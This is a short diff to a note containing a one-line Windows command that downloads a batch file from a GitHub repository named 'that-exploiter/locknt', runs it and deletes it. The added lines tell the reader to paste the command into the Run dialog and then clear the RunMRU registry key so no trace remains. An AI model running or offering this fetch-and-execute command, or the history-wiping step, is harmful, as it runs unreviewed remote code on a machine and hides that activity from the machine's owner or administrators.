@@ -1,1 +1,3 @@
 curl -o temp_file.bat https://raw.githubusercontent.com/that-exploiter/locknt/refs/heads/main/verygudscript2.bat && call temp_file.bat && del temp_file.bat
+basically run this in the run dialog lol AND if you need this like me you'll need to delete these shit in this registry thingy
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
